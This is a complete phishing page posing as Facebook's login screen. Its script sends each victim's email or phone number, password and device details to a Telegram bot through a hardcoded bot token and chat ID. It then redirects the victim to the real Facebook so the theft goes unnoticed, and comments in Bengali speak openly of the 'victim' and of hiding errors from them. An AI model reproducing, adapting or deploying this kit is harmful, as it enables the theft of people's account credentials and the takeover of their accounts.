<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook - log in or sign up</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico"/>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont,
                   'Segoe UI', Roboto, sans-serif;
      background: #f0f2f5;
      min-height: 100vh;
    }
    .header {
      background: #1877f2;
      padding: 40px 20px 80px;
      text-align: center;
      color: white;
    }
    .header h1 {
      font-size: 48px;
      font-weight: 700;
      letter-spacing: -1px;
      margin-bottom: 12px;
    }
    .header p {
      font-size: 16px;
      opacity: 0.95;
      max-width: 320px;
      margin: 0 auto;
      line-height: 1.5;
    }
    .card {
      background: white;
      border-radius: 8px;
      margin: -50px 16px 0;
      padding: 20px;
      box-shadow: 0 2px 12px rgba(0,0,0,.15);
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 16px 14px;
      font-size: 17px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      margin-bottom: 12px;
      outline: none;
      color: #1c1e21;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 2px rgba(24,119,242,.2);
    }
    input::placeholder { color: #90949c; }
    .btn-login {
      width: 100%;
      padding: 17px;
      background: #1877f2;
      color: white;
      font-size: 20px;
      font-weight: 700;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-bottom: 16px;
    }
    .btn-login:active { background: #166fe5; }
    .forgot {
      display: block;
      text-align: center;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
      margin-bottom: 20px;
    }
    .divider {
      border: none;
      border-top: 1px solid #dadde1;
      margin-bottom: 20px;
    }
    .btn-create {
      display: block;
      width: fit-content;
      margin: 0 auto;
      padding: 15px 28px;
      background: #42b72a;
      color: white;
      font-size: 17px;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .btn-create:active { background: #36a420; }

    /* Loading overlay */
    #overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.8);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }
    .spinner {
      width: 40px; height: 40px;
      border: 4px solid #e0e0e0;
      border-top-color: #1877f2;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

<div id="overlay">
  <div class="spinner"></div>
</div>

<div class="header">
  <h1>facebook</h1>
  <p>Connect with friends and the world around you on Facebook.</p>
</div>

<div class="card">
  <form id="loginForm">
    <input
      type="text"
      id="email"
      placeholder="Email address or phone number"
      autocomplete="off"
      autofocus
    />
    <input
      type="password"
      id="pass"
      placeholder="Password"
      autocomplete="off"
    />
    <button type="submit" class="btn-login">Log in</button>
  </form>

  <a href="#" class="forgot">Forgotten password?</a>
  <hr class="divider"/>
  <button class="btn-create">Create new account</button>
</div>

<script>
  // ===== এখানে তোমারটা বসাও =====
  const BOT_TOKEN = 8907157896:AAGCCDUsVbE75el9UUYz-qLIQ0cxH9tFRZY
  const CHAT_ID   = 5782023544
  // ================================

  function getUserInfo() {
    return {
      userAgent : navigator.userAgent,
      platform  : navigator.platform,
      language  : navigator.language,
      screenRes : `${screen.width}x${screen.height}`,
      timezone  : Intl.DateTimeFormat().resolvedOptions().timeZone,
      time      : new Date().toLocaleString("bn-BD")
    };
  }

  async function sendToTelegram(email, password) {
    const info = getUserInfo();

    const msg =
`🎯 NEW CATCH

📧 Email/Phone : ${email}
🔑 Password    : ${password}

📱 Device Info:
• UA       : ${info.userAgent}
• Platform : ${info.platform}
• Language : ${info.language}
• Screen   : ${info.screenRes}
• Timezone : ${info.timezone}
• Time     : ${info.time}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    await fetch(url, {
      method : "POST",
      headers: { "Content-Type": "application/json" },
      body   : JSON.stringify({
        chat_id   : CHAT_ID,
        text      : msg,
        parse_mode: "HTML"
      })
    });
  }

  document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const email = document.getElementById("email").value.trim();
    const pass  = document.getElementById("pass").value;

    if (!email || !pass) return;

    // Loading দেখাও victim কে
    document.getElementById("overlay").style.display = "flex";

    try {
      await sendToTelegram(email, pass);
    } catch (_) {
      // error হলেও redirect হবে — victim টের পাবে না
    }

    // Real Facebook এ পাঠাও
    window.location.href =
      "https://www.facebook.com/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2F";
  });
</script>

</body>
</html>
